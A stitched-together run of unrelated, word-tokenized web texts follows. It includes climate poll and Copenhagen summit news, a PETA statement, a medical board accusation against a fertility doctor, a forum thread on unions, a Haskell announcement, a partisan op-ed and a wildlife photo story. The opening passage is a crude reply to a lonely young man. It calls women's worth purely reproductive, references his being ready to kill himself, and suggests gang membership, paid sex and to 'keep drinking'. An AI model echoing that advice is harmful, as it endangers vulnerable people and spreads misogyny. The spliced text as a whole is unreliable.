You might catch the interest of an 18 - YO girl but she wo n't be at a club since the legal age is 21 .
And part of the curse of young adulthood ( for both sexes ) is a lack of experience in life .
That 's a sub - strike against you to go with the biology and sexual politics of age .
Third , you are straight .
If you were gay you could be meeting / having sex with any number of guys before midnight tonight , no problem , yet even here in Rochester , NY .
But you 're not .
And last , you are very likely NOT well - off .
Make $ 25k / yr and expect to be a babe magnet ?
Forget it.20 years ago I was in the same position you are in , as are 99 % of young men .
You are appreciated in society if you are willing to get killed or kill others in the name of their freedom or well - being , or if you are the son of wealthy / influential people .
Other than that , you are utterly disposable to everyone but your parents .
It will not be until or unless you make decent money , get a bit older and wiser , and thus more valuable to society ( ie , women ) that you stand a chance out there in the social scene .
To make matters worse , the average 18 - 30 YO female is more comfortable and often prefers the company of other females her age .
Straight men rarely seek the company of other men their age since what they really want to do is f-ck the girls - unless the other guy is a babe magnet for whatever reason , in which case the motivation remains the same .
The girls want to f-ck , too , but " not just anyone " .
That 's hormones and biology at work ... at work against you .
Now that you are ready to kill yourself , take heart in a few salient facts of life : 1 .
As time goes on , your value in society goes up .
You start as a disposable sperm - farm and eventually end up valued .
That is because implicit in your ability to survive until you 're at least 30 or 40 is your fitness as a source of offspring and what you can give to others based on your work and experience .
You remain valuable , as do females , for what you can do for others .
Human beings are ruthless exploiters of their own kind and this has not changed in millenia , though how this manifests does vary here and there .
2 .
As women age , their value declines .
That is because , as you may have guessed based on item 1 , it 's all about reproductive / sexual potential .
As theirs wanes , their power does to ; as yours waxes , your power also waxes .
That is why a bubbleheaded fool like , oh , say , Paris Hilton , commands headline attention while her equally - vapid and stylish mother does not .
3 .
So as you get older , life gets better for you in terms of your place in society .
But in other ways , it may get worse .
Likewise for women as they age , their value declines but in some ways , life gets better .
There is no way to solve this problem short of , say , joining a street gang .
Those guys make lots of money selling drugs and thus have no trouble getting girls .
Girls like " security " , which means money .
It 's all about money .
It always has been and always will be .
You could be as unappealing as Bill Gates but with his money you can bang every super - hot babe on the planet .
This is why law enforcement efforts to stop " gang activity " are doomed to utter and dismal failure .
When money and pu$$y is on the line , there is nothing stopping the train .
So if you really want to become more appealing socially , find some way to make a lot money fast .
Otherwise I suggest you simply bide your time and content yourself with handjobs at massage parlors or $ 20 blowjobs on Mt Read .
Or , you could sign up with the local model rocketry club and at least there you can swap stories about how far you got your rockets to fly and what are the best masturbatory techniques for banging it off right in time when the coxman nuts his load in the porno you plan to watch after you 're done playing with your model rockets .
You do have one thing down though : drinking .
Keep drinking .
At your age , it 's all you 've got .
But hang in there , resist the urge to kill yourself .
It will get better , trust me .
In recent years , there has been a controversy swirling in animal rights circles , as some people such as Victor Schonfeld object to the work of groups such as Peta , which , while abolitionist and determined to get animals off the dinner plate and out of the fur farms , circuses and laboratories , have nevertheless been working with corporations to achieve animal welfare reforms within their industries .
A few outspoken critics of such " half measures " or " baby steps " have gone so far as to argue against Peta 's campaigns for improved slaughter practices for chickens , better living conditions for hens and larger cages for animals in laboratories .
We find this attitude unhelpful to the goal of animal liberation .
Not only is it possible to work for an end to animal slavery while simultaneously supporting incremental change , moving the bar closer to that goal also seems to us to be an important step .
Yes , it is more comfortable for industry and consumers alike , but short of a bloody revolution of the sort history has witnessed in other social movements , it is also nearly impossible to move a society forward in any other way .
The vast majority of people , if they care about animals − and consumer surveys show that they do − support incremental improvements , even if the increments are far from wholly satisfactory to the animals , who would rather not be caged and mutilated , hung upside down and killed , and to the liberationists , who chafe at such slow progress .
It seems obvious that society is more likely to progress in a way that causes particularly abusive systems to be improved or eliminated before full animal liberation is achieved .
If society 's perspective is that animals should have no rights or interests at all , then moving from that mentality to complete animal liberation will require an impossibly enormous shift in viewpoint , no matter how much more enlightened this generation is than the last when it comes to understanding the complex behaviour and needs of all the various species from dog to duck .
However , once society gets the picture provided by ethologists and others who study animals in nature and captivity , the interests not only of great apes and whales but also of the " humbler " species we have long taken for granted and whose fundamental interests have been totally disregarded , including chickens , pigs and other animals , will be understood and begin to be respected .
That is when massive changes will come about in what we eat and wear and how we test chemicals .
Not to change would be an indictment of our humanity , our societal values , ourselves .
Now that some of the world 's largest corporations are saying , " Yes , we understand that animals can suffer , and we see that this is a real concern , " the discussion has begun in earnest .
For those who decry gradualism , the practical philosopher Peter Singer would ask , " Would you prefer to live in the horror you 're in , bred to grow seven times more quickly than natural so that your bones splinter and your organs collapse , or would you prefer to be able to live without chronic pain ?
Would you prefer to live your life crammed into a small cage , unable to lift your wings , build a nest , or do almost anything else that you would like to do , or would you prefer to , at the very least , be able to walk ?
Would you prefer to be hung upside - down by your feet and then scalded to death or lose consciousness when the crate you are in passes through a controlled atmosphere stunner ? "
The answers should be clear .
Campaigns against the practices of fast - food chains and the campaign to ban battery cages , which have been heavily supported by the hard work of tens of thousands of grassroots activists , have improved the living and dying conditions of millions of animals .
As the industries change and evolve , the improvements will apply to billions of animals every year .
At Peta , we completely understand the appeal of battle cries such as " Not bigger cages − empty cages ! "
But giving a little comfort and stimulation for animals who will be in those cages their whole lives is worth fighting for , even as we demand those empty cages .
Not only is it the best thing for the animals in the cages , it 's also the best thing for animal liberation .
It 's a stepping stone on the road to animal liberation .
As for the sexy women in our ads , the silly costumes , the street tableaux and the tofu sandwich give - aways , in a world where people want to smile , can't resist looking at an attractive image and are up for a free meal , if such harmless antics will allow one individual to reconsider their own role in exploiting animals , how can it be faulted ?
Yes , Peta could restrict its activities to scientific work , but how often do you read of that in the papers ?
It could just hand out lengthy tracts about ethics , but how many people would stop and take one , let alone read it ?
Any peaceful action that opens eyes , hearts and minds should be commended , not condemned .
Victor Schonfeld 's film is a wonderful milestone and provides an excellent education , but there must be constant incremental daily efforts − not just big hurrahs − or we will never succeed .
Too many lives depend on that success for us to be worried about how grand and perfect we are on the way to saving them .
More Americans believe steps taken to reduce global warming pollution will help the U.S. economy than say such measures will hurt it .
It ’s a sign the public is showing more faith in President Barack Obama ’s economic arguments for limiting heat - trapping gases than in Republican claims that the actions would kill jobs .
In an Associated Press - Stanford University poll , 40 percent said U.S. action to slow global warming in the future would create jobs .
Slightly more , 46 percent , said it would boost the economy .
By contrast , less than a third said curbing climate change would hurt the economy and result in fewer jobs , a message Republican members of Congress plan to take to an international global warming conference in Copenhagen this week .
“ They ’re wrong , ” Ron Classen of Seattle , who participated in the poll , said of the GOP stance .
“ People are going to be shifted from one job to another , ” said Classen , a self - described fan of environmentalist and former Vice President Al Gore .
The survey ’s results seem to boost Democratic efforts to curb global warming pollution and sign on to an international agreement to reduce heat - trapping gases , despite the concerns many Americans have about the recession and the high unemployment rate .
For some , the recession has manifested itself in a nothing - left - to - lose attitude when it comes to tackling climate and to sparking a revolution in where and how the nation produces its energy .
“ I do n’t know if anybody has looked around lately , but the economy is dead , ” said Jake Berglund , a home - improvement contractor from Portland , Conn .
“ We are in a sinking ship , and Obama has bought us enough life rafts to keep on going .
But we need to figure out how to build a new boat when we are still on the water . ”
The poll , however , also suggests that Americans have limits to how much they want to pay to address global warming .
Obama and many Democrats in Congress envision shifting the country away from burning fossil fuels to cleaner forms of energy , in a part by passing a new law that would set up a cap - and - trade system that puts a price on pollution .
While three - quarters of respondents said they support action of some kind on climate change , just as many said they would oppose the cap - and - trade system if it raised their electricity bill by $ 25 a month .
A majority — 59 percent — would n’t support cap - and - trade if it meant paying $ 10 extra a month for electricity .
Under cap - and - trade , companies that release greenhouse gases when they manufacture electricity would pass the cost of buying pollution permits or investing in cleaner technologies down to consumers .
This added cost allows alternative sources of energy such as wind and solar that tend to be more expensive to compete with cheaper but dirtier forms of energy such as coal .
“ People just do n’t like higher taxes and higher prices simply to manipulate their behavior , ” said Jon Krosnick , a Stanford University professor of political science who has been polling the public on global warming for 15 years .
“ Much larger majorities continue to favor government requiring businesses or offering them tax incentives to reduce their emissions even if it would cost Americans money . ”
The Obama administration has doled out billions in economic stimulus dollars to help fund clean energy technologies .
It has also pursued mandates that would require cleaner - burning cars and require power plants and factories to install technologies to reduce heat - trapping pollution from their smokestacks .
By increasing the cost of doing business , the cap - and - trade bill and the regulations backed by the White House may mean there would be fewer jobs in coal mining , oil refining and other industries that emit greenhouse gases .
But many jobs would probably be replaced by “ green jobs ” such as making wind turbines , installing solar panels and insulating homes .
Walter Hornbeak , a 67 - year - old Republican from Tennessee who built equipment for coal - and nuclear - fired power plants in the 1980s , said , “ We have too much imagination to sit there and be stagnant . ”
Reducing global warming “ would give the private sector the incentive to go out and start investing and finding ways to help more , ” Hornbeak said .
Some Republicans in Congress disagree .
“ If President Obama has his way , the Copenhagen conference will produce mandatory emissions limits that would destroy millions of American jobs and damage our economic competitiveness for decades to come , ” Rep. Marsha Blackburn , R - Tenn. , said in the GOP radio address last Saturday .
There is a recognition , based on the AP poll , that eventually everyone would have to change their habits .
Sixty - five percent said global warming could be slowed only if people make major changes in their lifestyle .
“ It would hurt , ” said Joe Fletcher , a tax accountant from Woodbridge , N.J. , who was among the third who said reducing global warming pollution would cost jobs and harm the economy .
Fletcher , however , still supports cap and trade .
“ But if you look at it in an overall planetary perspective , you might need to do something like this … to help your environment and grandchildren , ” Fletcher said .

The Medical Board of California has accused a Beverly Hills fertility doctor of a pattern of gross negligence that led to the birth of Nadya Suleman ’s 14 children , including the world ’s longest - surviving octuplets , and created a “ stockpile ” of unused frozen embryos which serve “ no clinical purpose . ”
The 13 - page accusation filed in December against Dr. Michael Kamrava paints a picture of 11 years of medical care in which Suleman returned to Kamrava ’s office again and again to undergo fertility treatments .
Often , she would return three or four months after giving birth .
Kamrava transferred an excessive number of embryos -- a number beyond what is considered acceptable by fertility standards -- on six occasions , according to the accusation .
The number of embryos Kamrava transferred in July 2008 was so outside the norm that they “ should not be transferred into any woman , regardless of age , ” the document said .
That transfer , which resulted in the octuplets , went “ beyond the reasonable judgment of any treating physician , ” the board wrote .
Kamrava also failed to refer the single mother for a mental health evaluation and repeatedly helped her create fresh embryos even though she already had a number of them frozen , according to the accusation .
The board also alleged that Kamrava kept shoddy records and negligently provided Suleman with high doses of fertility drugs .
Kamrava , whose medical license could be revoked if the accusations are proved , could not be reached for comment .
However , attorney Peter Osinoff spoke on the doctor ’s behalf .
“ I think it ’s safe to say he ’s been devastated by all this , ” Osinoff said .
“ It ’s a very traumatic thing for him to go through this very public episode and scrutiny , starting with the public opprobrium and culminating now in the state board action . ”
Kamrava was following his patient ’s demands , Osinoff said .
“ The question is -- and society may not approve -- but if it ’s satisfactory between patient and physician , that is something to be weighed very significantly , ” Osinoff said .
Osinoff said that medical guidelines on embryo transfers are guidelines only , and not law .
He also said there were no standards requiring patients to be referred for mental health evaluation .
“ Guidelines do n’t necessarily apply to each individual case , ” Osinoff said .
“ Patient history has to be taken into account .
Patient desire has to be taken into account .
Patient demand has to be taken into account .
I can assure you that in all respects , Dr. Kamrava was attempting to comply with patient preference . ”
In the months after the octuplets ’ birth at Kaiser Permanente Medical Center in Bellflower , Kamrava and Suleman were the subject of intense scrutiny .
Although the births were briefly heralded as a medical miracle , a backlash occurred almost immediately as more details were disclosed .
Fertility experts criticized Kamrava for excessive embryo transfers .
The American Society of Reproductive Medicine expelled him in September .
And Suleman , it turned out , was a 33 - year - old single , unemployed woman -- and already the mother of six children conceived through in vitro fertilization .
She lived with her mother , whose house was in foreclosure , and was supported , in part , by public money .
Angry taxpayers criticized behavior they deemed irresponsible ; even her publicists were subject to death threats .
In her only interview with a mainstream news organization , she told NBC’s Ann Curry that she returned to Kamrava that final time because she had unused frozen embryos and did not know what to do with them .
“ I could n’t live with the fact that , if I had never used them , and , you know , I ’ll be 70 years old and regret the fact that I did n’t allow these little embryos to live or give them an opportunity to grow , ” Suleman told Curry in the “ Dateline NBC ” interview .
Disposing of them was not an option , she said .
“ I believe children are blessings from God .
And to allocate that role to a doctor , to dispose of a life is incomprehensible to me , ” Suleman said .
But the chain of events laid out in the medical board accusation calls Suleman ’s explanation into question .
In 2008 , despite a “ stockpile ” of embryos frozen from seven separate egg retrievals , Suleman underwent additional fertility treatment to create fresh embryos -- a pattern that was repeated multiple times .
Suleman ’s attorney , Jeff Czech , declined to comment , as did her mother , Angela Suleman .
Fertility doctors said that it ’s difficult to judge whether fresh or frozen embryos should have been used , but that the medical board seems to be “ throwing the book at him , ” said Dr. Arthur Wisot of the Redondo Beach - based Reproductive Partners .
Fighting the accusations could prove difficult , experts said .
“ There ’s no doctor that I ’ve talked to that would get on the stand and feel comfortable defending his actions , ” Wisot said .

AT&T did not take kindly to remarks made by White House Deputy CTO Andrew McLaughlin comparing oppressive Chinese censorship to the practice of American ISPs .

McLaughlin , a major supporter of net neutrality rules , made the comment in a telecom law conference last Thursday by the University of Nebraska - Lincoln law school .
Reaction was swift from AT&T 's chief lobbyist , Jim Cicconi :
" It is deeply disturbing when someone in a position of authority , like Mr. McLaughlin , is so intent on advancing his argument for regulation that he equates the outright censorship decisions of a communist government to the network congestion decisions of an American ISP .
There is no valid comparison , and it's frankly an affront to suggest otherwise , " Cicconi said .

Maybe so , but it's a slippery slope .
At any rate , the bottom line is that ISPs are going to end up screwing us one way or another — either with some sort of tiered internet , or pricey data caps .

[ Haskell - cafe ] ANN : Hemkay , the 100 % Haskell MOD player
Hello all , I just uploaded the fruit of a little side project .
Hemkay [ 1 ] is an oldschool module music [ 2 ] player that performs all the hard work in Haskell .
If there was any goal , it was to express the transformation from the song structure to the output of the mixer as a series of function compositions , maintaining a style that one might call idiomatic Haskell .
Considering the dirtiness of the format in question , I 'm quite pleased with the initial version .
Still , I 'd be curious to see how the overall quality of the code could be improved .
In particular , retrieving and updating record fields is somewhat inconvenient .
Also , the actual mixing ( limited to the mixChunk function ) is embarrassingly slow , and I wonder how much it could be improved without leaving the pure world .
The program uses Portaudio for playback , but that might easily change in the future .
The problem is that I could n't get sound to work smoothly when producing samples in batches , so I 'm sending them off one by one (! ) at the moment , which does n't help with performance either .
I 'm open to suggestions as to what library to use to push data to the sound card .

I was actually asked during an internal job interview if " I had a boyfriend or was planning to get married " .
I did n't complain officially , I just left the company as I could afford to at the time and found something better .
Sadly , there is a bit of a risk in going full throttle and deciding to sue .

A question about that firing though do n't these places have unions ?
I was under the impression that the unions were able to put an end to those types of shenanigans .
From : mutive
2010-01-21 11:31 pm ( UTC )
Sometimes the unions are the ones responsible .
Often that 's why some of this goes on .
The unions are controlled by the " old boys " , and management finds it easier to fire a woman who is unlikely to sue ( for fear that she 'll never be able to find another job as word gets around that she 's trigger - happy ) than it is to upset things with the union .
It 's really , really sick .
And it's this sort of behavior that makes me HATE working in union facilities .
While I 'm sure that some are great , an awful lot seem to be determined to keep the status quo , no matter how vile .
( And , yeah , the non-union places I 've worked have ALWAYS been better .
Go figure ... )

We 're not a democracy , we 're a republic .
It was intentionally done to protect the rights of the minority from the whims of the majority .
It 's a GOOD system .
Democracy , in the hands of the " right " mob is no better than a totalitarian dictator .
This so many unions have proven to me over the past decade ...
I know that I 'm in the " management " ranks and thus supposed to hate unions , but even objectively , it 's realy hard for me to be OK with a group that is defending someone who oh , say , beat up a coworker , knifed someone at a bar , harassed a female coworker ( badly , not just a word here and there , but continuing abuse ) , or , in one lovely case , pinioned a woman between the forks of a fork lift and a wall .
I think that it 's fair that I want these guys out of my plant , and really resent that the union has stopped me from firing them ( and when the other union workers try to speak out ?
Yeah , they 're then harassed to shut up and defend the guy .
Real fair , right ? )

There are no good bosses just nice ones and how exactly does a voluntary community with people organizing themselves and taking over the means of production so that they can have complete control over their own lives and their own labor translate into mob rule ?
Does that mean Chiapas Mexico is no better than Stalinist Russia ?
Union nowadays ( at least in the U.S. ) have their own hierarchy so right there the idea has deviated into something far from it 's original intent but the labor struggle in America is what got a lot of necessary labor reforms like the 8 hour work day , maternity leave , medical benefits , safe working conditions , child exploitation , ect. ect. and in many cases are still the only things keeping the workers from being totally exploited by those at the top .
Now I 'll concede to the fact that unions can be inefficient at best and counter productive at worst but that just needs we need to work harder at improving them instead of giving up our power hoping to get that one magical boss that 'll take advantage of us less than all the other ones .
From : mutive

It depends a lot on the unions .
I 've seen them do good things .
I 've also seen them harass workers into not complaining about problems that are really major .
And it sucks to be told , " We really want this incredibly unsafe thing stopped , but if you ask us to tell someone else to back you up , we wo n't because then the rest of the union members will come after us " far too often to be of the opinion that unions are these great and wonderful things .
Some are marvelous .
Some are n't .
And I get REALLY annoyed when the many , many people who 've never worked around one tell me how I 'm this horrible , nasty , person for not believing that unionized labor is the best thing on earth .
Of course , if you have a bad union OR boss , you can always quit .
( Great , that ! )
If your company treats you poorly , does n't give you benefits , does n't pay your wages on time , whaetver , go for it !
Just neither is necessarily good or bad .
The ( non-union ) people at my current work place get over time , benefits , 401Ks , etc .
Many came from a better paying union facility to work here as conditions were so vile there ( and allowed to be by the union , when not actually enforced by the union - trust me , most companies LIKE having good board operators , and the fact that they are female is n't a big deal ) that they were willing to take a pay cut .
Not that all unions are bad , but I 've seen some really , really awful ones .
And I 've seen some that not only allow , but pretty much enforce the worst things about working in manufacturing .
One thing unions are great at ?
Keeping people from being fired .
Great when it's for reasons like age , sickness , etc .
Not so great when it's for things such as dangerous behavior , faking an injury to get time off work with full pay , harassing a co-worker , or other similar stuff .
It 's a mixed bag .
I 've generally found things to be better at non-union facilities , but some of that is likely because they tend to be in newer industries .
And no , the non-union guys do n't make significantly less and / or have significantly worse benefits than the union guys .
Maybe this is because companies know that the non-union could otherwise hop to the union companies otherwise , but ... maybe it 's because capitalism works .
( i.e. if you can only hire people who do X for $ 20 / hr , that 's what you pay , or slightly more to keep the good ones )

LONDON , Jan. 11 ( UPI ) -- Britain has launched a $ 160 billion program to make the country the world 's leader in offshore wind energy .
No less than 16 European utilities were awarded licenses last week to develop wind farms off the British coastlines .
Today , less than 2 gigawatts of power is generated by offshore turbines across the world -- the British program foresees an extra 32 GW to be installed , enough to power millions of homes .

" The lesson from other countries in onshore wind is that being an early mover is essential , " Britain 's Secretary of State for Energy and Climate Change Ed Miliband
said Friday .
" That 's why we are building on our status as a world - leading offshore wind generator by taking it to a whole other level today . "
Companies that will build the farms include such prolific names as Eon , Statoil , Siemens , Vattenfall , Centrica and RWE .
They were awarded licenses by The Crown Estate , a property portfolio owned by the British royals that is managing the offshore property for the government .
" The U.K. is a world leader in offshore wind energy and we are particularly encouraged by the cross- party support " for the energy source , Crown Estate Chief Executive Officer Roger Bright said Friday .
" This will give investors confidence for the long - term future of the industry . "
The British government expects 70,000 jobs to be created by the program , which is key to meet Britain 's climate protection targets .
London has pledged to meet 15 percent of its energy needs from renewables by 2020 .
It will take some years until the turbines will actually turn , however .
Companies will have to establish a connection to the national power grid .
It remains to be seen whether firms will build the turbines in Britain -- the only existing facility , owned by Denmark 's Vestas , closed last year .
That said , a lot of the jobs created could go to turbine makers in Germany and Denmark .
Regarding infrastructure , job creation should stay in Britain though .
" The scale of round three will require a dramatic increase in manufacturing capacity for offshore wind , such as turbines , foundations , offshore electrics and installation vessels , " the British Wind Energy Association said in a statement .
Another major offshore wind project , the 1 GW London Array , is under construction in the Thames estuary .

Interview with US Economist Dennis Meadows ' Copenhagen Is About Doing As Little As Possible '
With his 1972 book " The Limits to Growth , " Dennis Meadows was one of the first to warn about the looming environmental crisis .
The US economist spoke to SPIEGEL ONLINE about the need to drastically change our behavior and why he does n't expect much from the global climate change summit in Copenhagen .
The Prince of Wales has warned climate negotiators in Copenhagen that the " eyes of the world " are on them and that " our planet has reached a point of crisis " , leaving only seven years before " we lose the levers of control " on the climate .
The prince was addressing ministers at the formal opening of the high - level talks .
" It is no understatement to say that , with your signatures , you can write our future , " he told them .
And in an apparent reference to disagreements between rich and poor nations he said that all countries needed to work together — climate change was not resolvable " in terms of ' them and us ' " , he said .
The prince , who has long campaigned for the survival of rainforests , said that forest protection would be key to a successful deal .
" It seems the quickest and most cost - effective way to buy time in the battle against catastrophic climate change is to find a way to make the trees worth more alive than dead , " he said .
But even as he spoke , plans for a revolutionary agreement to end deforestation and pay poor countries to protect their forests were hanging in the balance after leaked papers showed that a new proposed text has removed many of the scheme 's safeguards .
It emerged that the negotiating text leaked to NGOs late last night showed that the language meant to cut the approximately 20 % of global greenhouse gases from deforestation in developing countries — the so - called Reducing Emissions from Deforestation and Degradation scheme ( Redd ) — has now removed all targets for ending deforestation and significantly weakened other areas .
" Without targets , Redd becomes toothless , " said Peg Putt of the Wilderness Society .
" The so - called safeguards will be nothing but fancy window - dressing unless they are given legal force . "
Forests protection is crucial to an ambitious deal at Copenhagen because it will not only save up to 20 % of emissions which come from deforestation , but the forests provide a massive store of carbon against which countries can offset emissions at home .
In return , it was hoped that it could provide up to $ 40 bn a year for some of the poorest countries in the world , including Congo DRC , Papua New Guinea , Indonesia and Gabon .
In addition , countries which have already cut down their forests stand to benefit from money for reforestation .
Nobel peace prize - winning environmentalist Wangaari Maathai , whose efforts have resulted in more than 1bn trees being planted by individuals worldwide in the last few years , urged countries to set ambitious targets .
She told the Guardian : " We realise now that forests are much more important for services such as regulating the flow of water , climate medicine and food .
We appeal to leaders to protect the forests . "
Targets for deforestation in the earlier text aimed to cut deforestation by 50 % by 2020 and eliminate it by 2030 .
These targets have now been lost .
Start - up costs for Redd are estimated to be £ 13.6 - 22.7bn from 2010 - 15 to support preparatory activities , although some experts challenge those figures as far too low .
Forest groups reacted with clear disappointment .
" It 's hardly surprising that developing countries wo n't commit to global targets for deforestation when rich countries have n't yet provided the necessary financing for Redd or global targets for deep reductions of industrial emissions , " said Nathaniel Dyer of Rainforest Foundation UK .
Of equal concern to forest - protection NGOs , language ensuring critical safeguards for biodiversity , forest conversion , indigenous rights , and monitoring has moved from operational text .
Protection of natural forests does appear explicitly in the text for the first time , and a safeguard on conversion of natural forests to plantations has reappeared , but neither are mandated .
" Limiting safeguards to the preamble weakens the agreement and deprives it of any assurance of compliance , " said Dr Rosalind Reeve of Global Witness .
" Global demand for forest commodities like illegal timber and palm oil is one of the leading causes of tropical deforestation around the world , " said Andrea Johnson of Environmental Investigation Agency .
" If we do n't address the causes of the problem , how can we find a solution ? "
Also missing from the negotiating text is any provision to protect and restore the world 's peat soils , which account for 6 % of all global C02 emissions .
" Peat soils are a key part of many countries ' plans to reduce their emissions , including large emitters like Indonesia , " said Susanna Tol of Wetlands International .
" Currently , an acre of forest is cut down every second , depriving the world of critical carbon reservoirs and creating huge emissions bursts into the atmosphere , " said Stephen Leonard of the Australian Orangutan Project .
" A Redd deal without global deforestation targets or safeguards makes it much more likely that the orangutan and other critical species that rely on the forest will become extinct . "
While text can still be changed , ministerial level actions will probably now be needed to reinsert targets and strengthen safeguard language .
" Clearly , everyone agrees that the world 's tropical forests need to be protected , " said Bill Barclay of Rainforest Action Network .
" But good intentions are n't enough , they have to be paired with action .
Ministers must act to strengthen the Redd text if we have any hope of a Redd that will be effective in protecting tropical forests . "
I would like to point out just four : the hypocrisy of the illegality of purchasing foreign prescription drugs , federal employee salaries , the job busting cap and trade legislation , and the wanton destruction of the dollar .
The price of prescription drugs in the United States has increased by 9 in the last year .
Certainly the ever increasing cost of drugs is a major reason for the pressure on Congress to reform our healthcare system .
However , currently it is illegal for Americans to import cheaper prescription drugs from outside the United States .
Drugs produced by American companies , but sold in foreign markets are usually between 35 to 55 percent lower in price due to price controls of other countries .
It is an outrage to me that we are not able to take advantage of the stupidity of other governments and import and buy their cheaper American made drugs .
The same bleeding hearts in D.C. that whine about how people are dying because they can't afford prescription drugs are standing in the way of those folks getting cheaper drugs .
Now , an argument given for keeping importation illegal is that the safety of the drugs cannot be guaranteed .
Nonsense !
We are talking about countries like Japan , the United Kingdom , and Canada which have product protection mechanisms in place .
Personally , I 've lived in the developing world for 8 years and my family has never had an issue with unsafe drugs in those countries .
The bottom line is that there is an easy way to cut drug costs and provide much needed medication to the financially strapped sick , but Congress refuses to do the right thing .
Then there is the story reported by USA Today that the number of federal employees who make $ 100,000 or more jumped from 14 percent to 19 percent of all bureaucrats during the first 18 months of the recession .
The average federal worker 's salary is now $ 71,206 compared to $ 40,331 for private sector employees .
To put it in even greater perspective , in December 2007 the Transportation Department had one employee earning $ 170,000 .
By June of 2009 the department had 1,690 workers with salaries above $ 170,000 .
Substantial pay raises and new salary rules were the reason for the jump in salaries .
So while 7.2 million Americans were losing their jobs , not only were financial institutions and car manufacturers bailed out , your tax dollars also went toward ensuring the comfort and security of our ruling bureaucrats .
Not only did Uncle Sam not cut back on labor costs like the rest of America , he handsomely rewarded those that produce very little if anything that benefits society .
All Americans should be furious .
Turning to the environment , if Congress was intent on destroying jobs in these tough times it would have immediately passed the 1500 page cap and trade legislation .
The painful new taxes the legislation would have imposed on all of us would have increased business costs and reduced aggregate demand thereby making an awful job market that much worse .
Additionally , Environmental Protection Agency administrator Lisa Jackson admitted during a Senate committee hearing that the bill would not significantly reduce global carbon concentrations in the atmosphere .
Fortunately , Democrats have sat on the legislation given the political risks to their careers of passing it .
But , just one minute , because to the rescue comes the EPA .
This past week the agency issued an “ endangerment finding ” that global warming is hazardous to human health .
In addition , the enviro - nazis at the EPA threatened Congress that if it did n't pass cap and trade then it , the EPA , “ would act on its own — and in a far more blunt fashion than Congress preferred . ”
According to one anonymous administration official , , ” the EPA is going to have to “ regulate in a command - and - control way , which will probably generate even more uncertainty . ”
Why is the EPA going to impose regulations that it admits will not significantly reduce global carbon concentrations in the atmosphere ?
Why does Congress put up with this extortion ?
Was n't the EPA created by Congress and thus answerable to it and not the other way around ?
Why would Congress allow a bunch of unelected bureaucrats to decide policy ?
The answer is easy : to deflect blame for stupid policy .
The EPA is doing Congress a favor – it is going to further drain our economy with expensive regulations and when your congressperson runs for reelection he / she can blame the EPA .
Of course , the question that should be asked at town hall meetings is , ca n't Congress take away the EPA 's power ?
Yes it can , and as Americans get wiser about what charlatans their elected leaders are they will press them more and more for upright answers .
Lastly , and most importantly , the American people should be outraged at the wanton destruction of their currency by the Fed , Congress , and two presidents .
In the last 3 years alone the dollar has lost 30 percent of its value !
What do you expect the way money has been thrown at financial firms , car manufacturers , and so forth .
For their part , the banks seem to have done well investing their bailout funds since they seem to be turning profits without loaning money .
The federal philanthropy continues – on Saturday , the Senate cleared the way for the passage of a $ 1.1 trillion spending bill .
The vote was held up for an hour to allow Senator an Orthodox Jew to walk more than 3 miles to the Hill on the Sabbath to cast the 60th vote to end debate .
Now , I am not an authority on Orthodox law , but did n't the Senator consider voting in the Senate chamber work ?
I suppose , like the Constitution that body continues to violate , when it serves their purpose members of Congress fell free to violate whatever parameters will get the job done .
All the bailouts and all this additional spending with money we do not have on aid for car dealers , loan guarantees for steel companies , and 5000 pork barrel projects for individual members continues to devalue our money making it that much harder for those already struggling to make ends meet in this horrendous economy Washington has given us .
Members of Congress are either charlatans or economic imbeciles because their inflationary policies hurt the same people they purport to help .
The whole thing is a stupendous outrage .
So , what is there to do ?
I already think it is too late ?
We owe 12 trillion dollars with none of our problems resolved .
Congress and the President seem hell - bent on making sure America is further bankrupted by every giveaway scheme imaginable – everyone knows the litany by now , too big to fail , too important to fail , so called environmental protection , cash for clunkers , homebuyer credits , etc , etc , etc … .
I suppose we have the mid-term elections to look forward to next year , but given past experience if Republicans take Congress it will be akin to going on a diet and drinking Bud Light instead of Regular Bud .
Bottom line : both are bad brands .
If this article has irritated you even just a little bit , understand that there is a lot more that Washington spews that is awful .
From prescription drugs to federal salaries it seems like Washington only cares about it special constituencies and not the rest of us who are hurting .
And these examples are just the tip of the iceberg .

Oops , they were n't logs after all :
The moment a crocodile was killed after taking a foolish shortcut across a herd of hippos
Advertisement
Their bone - crushing jaws , 24 razor - sharp teeth and armour - plated skin are enough to ensure most animals keep their distance .
But , as our incredible pictures show , even crocodiles are no match for a herd of angry hippos .
This young reptilian predator paid the price for swimming too close to a mother and her calves while they bathed .
As 50 hippos gathered into a defensive circle around them , the crocodile panicked and raced over their backs in a bid to escape .
Bold move :
The crocodile races across the backs of the hippos in a bid to escape after trying to snare a mother and her calves
Making a splash :
The crocodile writhes and wriggles but cannot escape the clutches of his angry opponents
It was the last mistake he ever made .
The beast 's defences were no match for the maze of angry mammals , who proved their bite is every bit as lethal as his .
The spectacularly rare battle of the beasts was captured by Czech wildlife photographer Vaclav Silha .
He had set up his camera on the banks of the River Mara in the Serengeti national park , Tanzania , when the unbelievable scene unfolded before him .
But the 45 - year - old got more than he bargained for when a colossal fight broke out between the group and a sneaky crocodile he had spotted earlier .
‘ Mutual respect between these animals means fights occur very rarely , ’ he said .
‘ One of the only reasons you might see a conflict is if the hippos have young and they think the little ones are under threat .
That ’s exactly what happened here .
In the jaws of death :
The crocodile is defeated by a maze of angry hippos after trying to kill one of their young
Make it snappy :
The raging hippos take revenge by biting back while feeding at the River Mara in Tanzania
‘ The incautious croc got too close to a female who had calves and the whole group gathered into a defensive circle around them .
It was a strong message for the crook to clear off .
‘ I have absolutely no idea why but the crocodile suddenly raced across the backs of the hippos .
I think it might have panicked and thought it was a possible escape route .
I could n’t believe my eyes .
‘ It was the worst choice the reptile could ever have made and it was definitely its last .
‘ The island of hippos suddenly erupted with teeth and all I could see was the crocodile being repeatedly crushed in their huge mouths . ’
Described as one of the most aggressive creatures in the animal kingdom , an adult hippo can apply several tons of pressure in a single bite .
‘ Even the toughest crocodile could not have withstood being repeatedly bitten like that , ’ said Mr Silha , from Prague .
‘ There was no way for him to escape .
I few seconds later his lifeless body slipped below the water and I did n’t see him again . ’
One of these pictures was originally published in the November issue of BBC Wildlife Magazine .

Radio 86's Mads Schmidt had a talk with Nis Hoyrup Christensen , Ph.d. DI , from Copenhagen Business School about China 's efforts to cut emissions by implementing sustainable solutions for renewable energy sources .
Also in context with the climate summit in Copenhagen .
Nis Hoyrup has done several publications on China and East Asia .
Mads : I read in your Ph.d. abstract on CBS home page that China is intending to extend it 's supply of energy coming from renewable energy sources from 8 percent in 2006 to 15 percent in 2020 .
How ambitious would you call this ?
